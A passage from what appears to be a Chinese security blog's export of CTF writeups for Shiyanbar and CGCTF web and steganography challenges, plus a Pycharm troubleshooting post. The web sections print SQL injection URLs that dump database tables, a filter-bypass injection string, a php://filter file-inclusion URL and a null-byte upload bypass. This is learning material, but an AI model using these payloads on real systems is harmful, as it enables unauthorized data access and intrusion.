class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><!--CTF{Y0U_4R3_1NCR3D1BL3_F4ST!}--><h1 id="这个看起来有点简单"><a href="#这个看起来有点简单" class="headerlink" title="这个看起来有点简单!"></a>这个看起来有点简单!</h1><p>常规注入<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://ctf5.shiyanbar.com/8/index.php?id=1 union select 1,2</span><br><span class="line">http://ctf5.shiyanbar.com/8/index.php?id=1 union select 1,database()</span><br><span class="line">http://ctf5.shiyanbar.com/8/index.php?id=1 union select 1,table_name from information_schema.tables where table_schema=database()</span><br><span class="line">http://ctf5.shiyanbar.com/8/index.php?id=1 union select 1,column_name from information_schema.columns where table_name="thiskey"</span><br><span class="line">http://ctf5.shiyanbar.com/8/index.php?id=1 union select 1,k0y from thiskey</span><br></pre></td></tr></table></figure></p><!--whatiMyD91dump--><h1 id="猫抓老鼠"><a href="#猫抓老鼠" class="headerlink" title="猫抓老鼠"></a>猫抓老鼠</h1><p>看看响应头<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Shiyanbar/Web/03-01.png" alt="" title="" class="">                <p></p>            </figure><br>content-Pow不是标准头信息，将值作为key再次提交得到flag<br><!--#WWWnsf0cus_NET#--></p><h1 id="what-a-fuck-这是什么鬼东西"><a href="#what-a-fuck-这是什么鬼东西" class="headerlink" title="what a fuck!这是什么鬼东西?"></a>what a fuck!这是什么鬼东西?</h1><p>fuckjs，jjencode<br><!--Ihatejs--></p><h1 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h1><p>00截断绕过，先抓取数据包<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Shiyanbar/Web/05-01.png" alt="" title="" class="">                <p></p>            </figure><br>修改包，如下图<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Shiyanbar/Web/05-02.png" alt="" title="" class="">                <p></p>            </figure><br><code>+</code>对应<code>2b</code>，修改为<code>00</code><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Shiyanbar/Web/05-03.png" alt="" title="" class="">                <p></p>            </figure><br>发送得到flag<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Shiyanbar/Web/05-04.png" alt="" title="" class="">                <p></p>            </figure><br><!--flag{SimCTF_huachuan}--></p><h1 id="因缺思汀的绕过"><a href="#因缺思汀的绕过" class="headerlink" title="因缺思汀的绕过"></a>因缺思汀的绕过</h1><p>右键源代码可以看到注释信息<code>source.txt</code><br>可以看到过滤了<code>and|select|from|where|union|join|sleep|benchmark</code><br>使用<code>group by pwd with rollup</code>查询<br><code>&#39; or 1=1 group by pwd with rollup limit 1 offset 2 #</code><br><!--CTF{with_rollup_interesting}--></p><h1 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h1><p>php名字-&gt;提交-&gt;flag<br><!--flag{ffifdyop_has_trash}--></p><p><br><br><br></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 实验吧 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CGCTF-Web-writeup</title>
      <link href="/2018/05/29/CGCTF-Web-writeup/"/>
      <url>/2018/05/29/CGCTF-Web-writeup/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>南邮Web题目writeup</p></blockquote><a id="more"></a><h1 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h1><p>略…<br><!--nctf{flag_admiaanaaaaaaaaaaa}--></p><h1 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a>md5 collision</h1><p>源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$md51 = md5(<span class="string">'QNKCDZO'</span>);</span><br><span class="line">$a = @$_GET[<span class="string">'a'</span>];</span><br><span class="line">$md52 = @md5($a);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($a))&#123;</span><br><span class="line"><span class="keyword">if</span> ($a != <span class="string">'QNKCDZO'</span> &amp;&amp; $md51 == $md52) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"nctf&#123;*****************&#125;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"false!!!"</span>;</span><br><span class="line">&#125;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">"please input a"</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>计算md5(‘QNKCDZO’)=’0e830400451993494058024219903391’<br>弱类型<code>==</code>绕过,看到0e开头，代表是科学计数法，也就是说０的多少次方都是０，所以’0e***’<code>==</code>0<br>参考：<a href="http://www.219.me/posts/2884.html" target="_blank" rel="noopener">http://www.219.me/posts/2884.html</a><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://chinalover.sinaapp.com/web19/index.php?a=s155964671a</span><br></pre></td></tr></table></figure></p><p>得到flag<br><!--nctf{md5_collision_is_easy}--></p><h1 id="签到2"><a href="#签到2" class="headerlink" title="签到2"></a>签到2</h1><p>查看源码，发现字数限制长度为10个，而‘zhimakaimen’有11个，F12修改下即可<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=UTF-8"</span> /&gt;</span></span><br><span class="line">尚未登录或口令错误<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"./index.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>输入框：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">name</span>=<span class="string">"text1"</span> <span class="attr">maxlength</span>=<span class="string">"10"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">请输入口令：zhimakaimen</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"开门"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><!--nctf{follow_me_to_exploit}--><h1 id="这题不是WEB"><a href="#这题不是WEB" class="headerlink" title="这题不是WEB"></a>这题不是WEB</h1><p>真的，你要相信我！这题不是WEB<br>确实不是web…把图片下载后用编辑器打开，最后有flag<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/CGCTF/Web/04-01.png" alt="" title="" class="">                <p></p>            </figure><br><!--nctf{photo_can_also_hid3_msg}--></p><h1 id="层层递进"><a href="#层层递进" class="headerlink" title="层层递进"></a>层层递进</h1><p>脑洞题，在404页面找到flag<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/CGCTF/Web/05-01.png" alt="" title="" class="">                <p></p>            </figure><br><!--nctf{this_is_a_fl4g}--></p><h1 id="AAencode"><a href="#AAencode" class="headerlink" title="AAencode"></a>AAencode</h1><p>一种编码：<a href="https://blog.csdn.net/qq_38329811/article/details/78186362" target="_blank" rel="noopener">https://blog.csdn.net/qq_38329811/article/details/78186362</a><br>解码网站：<a href="https://tool.zcmzcm.org/aadecode" target="_blank" rel="noopener">https://tool.zcmzcm.org/aadecode</a><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/CGCTF/Web/06-01.png" alt="" title="" class="">                <p></p>            </figure><br><!--nctf{javascript_aaencode}--></p><h1 id="单身二十年"><a href="#单身二十年" class="headerlink" title="单身二十年"></a>单身二十年</h1><p>打开发现有302重定向，不能直接访问search_key.php<br>用BP抓包，得到flag<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/CGCTF/Web/07-01.png" alt="" title="" class="">                <p></p>            </figure></p><p>也可以用脚本捕获<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    s = requests.session()</span><br><span class="line">    url = <span class="string">'http://chinalover.sinaapp.com/web8/search_key.php'</span></span><br><span class="line">    req = s.get(url)</span><br><span class="line">    <span class="comment"># req.encoding = 'utf-8'</span></span><br><span class="line">    print(req.text)</span><br><span class="line">    <span class="comment"># print(req.headers)</span></span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure></p><!--nctf{yougotit_script_now}--><h1 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h1><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/CGCTF/Web/08-01.png" alt="" title="" class="">                <p></p>            </figure><!--nctf{http_referer}--><h1 id="php-decode"><a href="#php-decode" class="headerlink" title="php decode"></a>php decode</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CLsI</span><span class="params">($ZzvSWE)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    $ZzvSWE = gzinflate(base64_decode($ZzvSWE));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($ZzvSWE); $i++) &#123;</span><br><span class="line"></span><br><span class="line">        $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $ZzvSWE;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">eval</span>(CLsI(<span class="string">"+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA=="</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将eval换成echo执行php得到flag，在线测试代码：<a href="https://tool.lu/coderunner/" target="_blank" rel="noopener">https://tool.lu/coderunner/</a><br><!--nctf{gzip_base64_hhhhhh}--></p><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p>查看源码，发现页面中链接带有参数file<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>asdf<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"./index.php?file=show.php"</span>&gt;</span>click me? no<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>访问下面url得到base64，解码得到flag<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></p><!--nctf{edulcni_elif_lacol_si_siht}--><h1 id="单身一百年也没用"><a href="#单身一百年也没用" class="headerlink" title="单身一百年也没用"></a>单身一百年也没用</h1><p>这题需要抓包，这次是藏在响应头里<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/CGCTF/Web/11-01.png" alt="" title="" class="">                <p></p>            </figure><br><!--nctf{this_is_302_redirect}--></p><p><br><br><br></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 南邮CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pycharm使用遇到的问题</title>
      <link href="/2018/05/21/Pycharm%E4%BD%BF%E7%94%A8%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/"/>
      <url>/2018/05/21/Pycharm%E4%BD%BF%E7%94%A8%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>本文用来积累pycharm使用过程中的各种问题</p></blockquote><a id="more"></a><h1 id="pip升级问题"><a href="#pip升级问题" class="headerlink" title="pip升级问题"></a>pip升级问题</h1><p>问题描述：在venv虚拟环境中升级pip，升级失败<br>升级命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m pip install --upgrade pip</span><br></pre></td></tr></table></figure></p><p>失败报错<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">(venv) C:\Users\zxw\PycharmProjects\<span class="built_in">test</span>&gt;python -m pip install --upgrade pip</span><br><span class="line">Collecting pip</span><br><span class="line">  Using cached https://files.pythonhosted.org/packages/0f/74/ecd13431bcc456ed390b44c8a6e917c1820365cbebcb6a8974d1cd045ab4/pip-10.0.1-py2.py3-none-any.whl</span><br><span class="line">Installing collected packages: pip</span><br><span class="line">  Found existing installation: pip 9.0.3</span><br><span class="line">    Uninstalling pip-9.0.3:</span><br><span class="line">      Successfully uninstalled pip-9.0.3</span><br><span class="line">  Rolling back uninstall of pip</span><br><span class="line">Exception:</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"C:\Users\zxw\PycharmProjects\test\venv\lib\site-packages\pip-9.0.3-py3.6.egg\pip\basecommand.py"</span>, line 215, <span class="keyword">in</span> main</span><br><span class="line">    status = self.run(options, args)</span><br><span class="line">  File <span class="string">"C:\Users\zxw\PycharmProjects\test\venv\lib\site-packages\pip-9.0.3-py3.6.egg\pip\commands\install.py"</span>, line 342, <span class="keyword">in</span> run</span><br><span class="line">    prefix=options.prefix_path,</span><br><span class="line">  File <span class="string">"C:\Users\zxw\PycharmProjects\test\venv\lib\site-packages\pip-9.0.3-py3.6.egg\pip\req\req_set.py"</span>, line 784, <span class="keyword">in</span> install</span><br><span class="line">    **kwargs</span><br><span class="line">  File <span class="string">"C:\Users\zxw\PycharmProjects\test\venv\lib\site-packages\pip-9.0.3-py3.6.egg\pip\req\req_install.py"</span>, line 851, <span class="keyword">in</span> install</span><br><span class="line">    self.move_wheel_files(self.source_dir, root=root, prefix=prefix)</span><br><span class="line">  File <span class="string">"C:\Users\zxw\PycharmProjects\test\venv\lib\site-packages\pip-9.0.3-py3.6.egg\pip\req\req_install.py"</span>, line 1064, <span class="keyword">in</span> move_wheel_files</span><br><span class="line">    isolated=self.isolated,</span><br><span class="line">  File <span class="string">"C:\Users\zxw\PycharmProjects\test\venv\lib\site-packages\pip-9.0.3-py3.6.egg\pip\wheel.py"</span>, line 462, <span class="keyword">in</span> move_wheel_files</span><br><span class="line">    generated.extend(maker.make(spec))</span><br><span class="line">  File <span class="string">"C:\Users\zxw\PycharmProjects\test\venv\lib\site-packages\pip-9.0.3-py3.6.egg\pip\_vendor\distlib\scripts.py"</span>, line 372, <span class="keyword">in</span> make</span><br><span class="line">    self._make_script(entry, filenames, options=options)</span><br><span class="line">  File <span class="string">"C:\Users\zxw\PycharmProjects\test\venv\lib\site-packages\pip-9.0.3-py3.6.egg\pip\_vendor\distlib\scripts.py"</span>, line 276, <span class="keyword">in</span> _make_script</span><br><span class="line">    self._write_script(scriptnames, shebang, script, filenames, ext)</span><br><span class="line">  File <span class="string">"C:\Users\zxw\PycharmProjects\test\venv\lib\site-packages\pip-9.0.3-py3.6.egg\pip\_vendor\distlib\scripts.py"</span>, line 212, <span class="keyword">in</span> _write_script</span><br><span class="line">    launcher = self._get_launcher(<span class="string">'t'</span>)</span><br><span class="line">  File <span class="string">"C:\Users\zxw\PycharmProjects\test\venv\lib\site-packages\pip-9.0.3-py3.6.egg\pip\_vendor\distlib\scripts.py"</span>, line 351, <span class="keyword">in</span> _get_launcher</span><br><span class="line">    result = finder(distlib_package).find(name).bytes</span><br><span class="line">AttributeError: <span class="string">'NoneType'</span> object has no attribute <span class="string">'bytes'</span></span><br></pre></td></tr></table></figure></p><p>解决办法<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m pip install -U --force-reinstall pip</span><br></pre></td></tr></table></figure></p><h1 id="安装pycrypto问题"><a href="#安装pycrypto问题" class="headerlink" title="安装pycrypto问题"></a>安装pycrypto问题</h1><h2 id="for-python2-7"><a href="#for-python2-7" class="headerlink" title="for python2.7"></a>for python2.7</h2><p>参考：<a href="http://yunnigu.dropsec.xyz/2016/10/18/%E5%AE%89%E8%A3%85pycrypto%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E7%B3%BB%E5%88%97%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">http://yunnigu.dropsec.xyz/2016/10/18/安装pycrypto遇到的一系列问题总结/</a><br>在安装pycrypto的时候出现unable to find vcvarsall.bat<br>问题原因：<br>很多python 库实际上使用c或者c++写的，所以安装编译时会需要用到msvc的东西；如果你的机器里没有装VS或者注册表设置不太对的话，就会报错。<br>微软出了一个msi包来解决这个问题：<br>Microsoft Visual C++ Compiler for Python 2.7<br>下载地址：<a href="http://www.microsoft.com/en-us/download/details.aspx?id=44266" target="_blank" rel="noopener">http://www.microsoft.com/en-us/download/details.aspx?id=44266</a></p><h1 id="安装时编译错误"><a href="#安装时编译错误" class="headerlink" title="安装时编译错误"></a>安装时编译错误</h1><h2 id="错误描述"><a href="#错误描述" class="headerlink" title="错误描述"></a>错误描述</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error: Microsoft Visual C++ 14.0 is required. Get it with &quot;Microsoft Visual C++ Build Tools&quot;: http://landinghub.visualstudio.com/visual-cpp-build-toolsfor</span><br></pre></td></tr></table></figure><h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><h3 id="安装VS-studio"><a href="#安装VS-studio" class="headerlink" title="安装VS studio"></a>安装VS studio</h3><p>略。。</p><h3 id="直接下载编译好的whl"><a href="#直接下载编译好的whl" class="headerlink" title="直接下载编译好的whl"></a>直接下载编译好的whl</h3><p>下载地址：<a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/" target="_blank" rel="noopener">Unofficial Windows Binaries for Python Extension Packages</a><br>以gmpy2为例，<code>Ctrl + f</code>找到对应python版本的gmpy2的whl文件（此文件pip可解析）<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Pycharm/2018-08-23-14-45-13.png" alt="gmpy2" title="" class="">                <p>gmpy2</p>            </figure><br>下载后<code>pip install 文件名</code>安装即可<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Pycharm/2018-08-23-14-49-37.png" alt="Pycharm虚拟环境的可在控制台中安装" title="" class="">                <p>Pycharm虚拟环境的可在控制台中安装</p>            </figure></p><p><br><br><br></p>]]></content>
      
      <categories>
          
          <category> Code </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Pycharm </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>实验吧-隐写术-writeup</title>
      <link href="/2018/05/15/%E5%AE%9E%E9%AA%8C%E5%90%A7-%E9%9A%90%E5%86%99%E6%9C%AF-writeup/"/>
      <url>/2018/05/15/%E5%AE%9E%E9%AA%8C%E5%90%A7-%E9%9A%90%E5%86%99%E6%9C%AF-writeup/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>实验吧隐写题writeup</p></blockquote><a id="more"></a><h1 id="Fonts"><a href="#Fonts" class="headerlink" title="Fonts"></a>Fonts</h1><p>这题主要考察word隐藏文字，在文件-&gt;选项-&gt;显示中勾选隐藏文字，即可得到flag<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Shiyanbar/STEGA-1/01-01.png" alt="" title="" class="">                <p></p>            </figure><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Shiyanbar/STEGA-1/01-02.png" alt="" title="" class="">                <p></p>            </figure><br><!--CTF{F_!o!_!n!_t_s}--></p><h1 id="流"><a href="#流" class="headerlink" title="流"></a>流</h1><p>Winhex大法简单粗暴<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Shiyanbar/STEGA-1/02-01.png" alt="" title="" class="">                <p></p>            </figure><br><!--CTF{NTFS_ADS}--></p><h1 id="小苹果"><a href="#小苹果" class="headerlink" title="小苹果"></a>小苹果</h1><p>1.先扫码<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Shiyanbar/STEGA-1/03-01.png" alt="" title="" class="">                <p></p>            </figure><br>2.unicode转字符串<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Shiyanbar/STEGA-1/03-02.png" alt="" title="" class="">                <p></p>            </figure><br>3.<a href="https://baike.baidu.com/item/%E5%BD%93%E9%93%BA%E5%AF%86%E7%A0%81/19848621?fr=aladdin" target="_blank" rel="noopener">当铺密码</a>解密<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">羊由大井夫大人王中工</span><br><span class="line">9158753624</span><br></pre></td></tr></table></figure></p><p>4.mp3解密<br>用winhex打开可以看到rar文件尾，将文件名后缀改成.rar解压出mp3文件<br>接下来用MP3Stego解密<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MP3StegoDecode.exe -X -P 9158753624 .\apple.mp3</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Shiyanbar/STEGA-1/03-03.png" alt="" title="" class="">                <p></p>            </figure><p>5.base64解码得到flag<br><!--CTF{xiao_ping_guo}--></p><h1 id="女神又和大家见面了"><a href="#女神又和大家见面了" class="headerlink" title="女神又和大家见面了"></a>女神又和大家见面了</h1><p>一张小姐姐的照片，用winhex打开发现有rar文件头，解压出来一个MP3文件和提示<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Shiyanbar/STEGA-1/04-01.png" alt="" title="" class="">                <p></p>            </figure><br>应该是MP3隐写，用MP3Stego解密<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MP3StegoDecode.exe -X -P simctf .\music.mp3</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Shiyanbar/STEGA-1/04-02.png" alt="" title="" class="">                <p></p>            </figure><p>base64解码得到flag<br><!--SimCTF{MP3_MP3_sdfdsf}--></p><h1 id="复杂的QR-code"><a href="#复杂的QR-code" class="headerlink" title="复杂的QR_code"></a>复杂的QR_code</h1><p>用winhex打开可以看到zip文件头<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Shiyanbar/STEGA-1/05-01.png" alt="" title="" class="">                <p></p>            </figure><br>binwalk分离<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop<span class="comment"># binwalk -e QR_code.png</span></span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             PNG image, 280 x 280, 1-bit colormap, non-interlaced</span><br><span class="line">471           0x1D7           Zip archive data, encrypted at least v2.0 to extract, compressed size: 29, uncompressed size: 15, name: 4number.txt</span><br><span class="line">650           0x28A           End of Zip archive</span><br></pre></td></tr></table></figure></p><p>提示4位数字，爆破一下,拿到flag<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Shiyanbar/STEGA-1/05-02.png" alt="" title="" class="">                <p></p>            </figure><br><!--CTF{vjpw_wnoei}--></p><h1 id="听会歌吧"><a href="#听会歌吧" class="headerlink" title="听会歌吧"></a>听会歌吧</h1><p>右键查看源代码，发现url后门是base64编码的文件名<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Shiyanbar/STEGA-1/06-01.png" alt="" title="" class="">                <p></p>            </figure><br>将download.php下载下来看看<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Shiyanbar/STEGA-1/06-02.png" alt="" title="" class="">                <p></p>            </figure><br>查看源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">﻿&lt;\?php</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"hereiskey.php"</span>);</span><br><span class="line">$url=base64_decode($_GET[url]);</span><br><span class="line"><span class="keyword">if</span>( $url==<span class="string">"hereiskey.php"</span> || $url==<span class="string">"buxiangzhangda.mp3"</span> || $url==<span class="string">"xingxingdiandeng.mp3"</span> || $url==<span class="string">"download.php"</span>)&#123;</span><br><span class="line">$file_size = filesize($url);</span><br><span class="line">header ( <span class="string">"Pragma: public"</span> );</span><br><span class="line">header ( <span class="string">"Cache-Control: must-revalidate, post-check=0, pre-check=0"</span> );</span><br><span class="line">header ( <span class="string">"Cache-Control: private"</span>, <span class="keyword">false</span> );</span><br><span class="line">header ( <span class="string">"Content-Transfer-Encoding: binary"</span> );</span><br><span class="line">header ( <span class="string">"Content-Type:audio/mpeg MP3"</span>);</span><br><span class="line">header ( <span class="string">"Content-Length: "</span> . $file_size);</span><br><span class="line">header ( <span class="string">"Content-Disposition: attachment; filename="</span>.$url);</span><br><span class="line"><span class="keyword">echo</span>(file_get_contents($url));</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Access Forbidden!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>同样方法将hereiskey.php下载下来得到flag<br><!--d0wnload_0k--></p><h1 id="SB！SB！SB！"><a href="#SB！SB！SB！" class="headerlink" title="SB！SB！SB！"></a>SB！SB！SB！</h1><p>StegSolve打开找到二维码<br><figure class="image-box">                <img 